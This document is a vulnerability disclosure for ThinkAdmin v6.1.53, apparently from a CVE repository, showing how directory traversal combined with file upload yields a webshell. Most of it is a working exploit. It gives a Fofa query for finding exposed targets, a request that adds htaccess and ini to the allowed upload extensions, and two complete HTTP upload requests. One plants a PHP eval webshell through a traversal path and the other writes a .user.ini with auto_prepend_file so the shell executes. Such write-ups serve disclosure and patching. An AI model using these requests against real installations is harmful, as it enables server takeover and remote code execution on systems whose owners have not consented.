ThinkAdmin directory traversal+file upload getshell



Project Introduction

ThinkAdmin is a product that follows [MIT]（ https://mit-license.org/ ）Protocol open source rapid development framework, based on the latest version of  ThinkPHP6 , a minimalist backend management system (compatible with ThinkPHP8)

Official website: https://thinkadmin.top/



Audit version: ThinkAdmin Version v6.1.53

![image](https://github.com/1dreamGN/CVE/assets/112082417/35545e1b-e345-40e9-b502-898b98944dc9)


 

Fofa : body="/admin/api.plugs/script"

![image](https://github.com/1dreamGN/CVE/assets/112082417/32f29b86-1841-441c-9b91-253dc1e53b44)


Vulnerability: Directory traversal+file upload=getshell
Install Composer on the official website
After installation, log in and enter the background
Firstly, set the uploadable suffix for the backend

![image](https://github.com/1dreamGN/CVE/assets/112082417/5beca66e-6158-4642-9bc4-7ea68c022b31)


http://localhost/admin/config/storage.html?spm=m-1-2-3
param：storage%5Bname_type%5D=xmd5&storage%5Blink_type%5D=none&storage%5Ballow_exts%5D=doc%2Cgif%2Cico%2Cjpg%2Cmp3%2Cmp4%2Cp12%2Cpem%2Cpng%2Czip%2Crar%2Cxls%2Cxlsx%2Chtaccess%2Cini&storage%5Blocal_http_protocol%5D=follow&storage%5Blocal_http_domain%5D=&storage%5Btype%5D=local

![image](https://github.com/1dreamGN/CVE/assets/112082417/5d2dde5f-24a3-4022-b7b2-6f7405dfdc08)


First upload a Trojan with any file content as webshell

`POST /admin/api.upload/file HTTP/1.1

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCUB3l9pNDT4UzMSU

Cookie: user cookie

Host: IP：PORT

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="key"

 

..\./1.zip

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="safe"

 

0

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="uptype"

 

local

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="file"; filename="1.zip"

Content-Type: image/png

 

<?php @eval($_POST[1]);?>

------WebKitFormBoundary3VyVEPpvQynFo76H--`

![image](https://github.com/1dreamGN/CVE/assets/112082417/df639676-98ae-4e83-bbf4-25491472ea26)


Construct Payload Upload

http://localhost/admin/api.upload/file

`POST /admin/api.upload/file HTTP/1.1

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCUB3l9pNDT4UzMSU

Cookie: user cookie

Host: IP：PORT

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="key"

 

..\./.user.ini

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="safe"

 

0

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="uptype"

 

local

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="file"; filename="1.ini"

Content-Type: image/png

 

auto_prepend_file=1.zip

------WebKitFormBoundary3VyVEPpvQynFo76H--`

![image](https://github.com/1dreamGN/CVE/assets/112082417/6e90c2b4-8c5e-44a4-945c-cb98e30a86f6)

![image](https://github.com/1dreamGN/CVE/assets/112082417/94ec0974-5103-4735-b179-24af001735e1)

You can see that everything has been uploaded successfully

![image](https://github.com/1dreamGN/CVE/assets/112082417/0ebdec09-b37b-4f7f-a8d8-066c0b84c734)


 

Webshell also successfully parsed
